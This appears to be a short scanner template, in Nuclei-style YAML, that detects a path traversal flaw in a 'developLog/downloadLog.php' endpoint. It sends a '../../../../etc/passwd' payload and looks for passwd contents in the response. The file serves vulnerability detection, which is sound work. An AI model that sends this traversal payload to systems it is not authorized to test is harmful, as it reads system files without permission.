http:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - part: content_type
    type: word
    words:
    - application/force-download
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/developLog/downloadLog.php?name=../../../../etc/passwd'
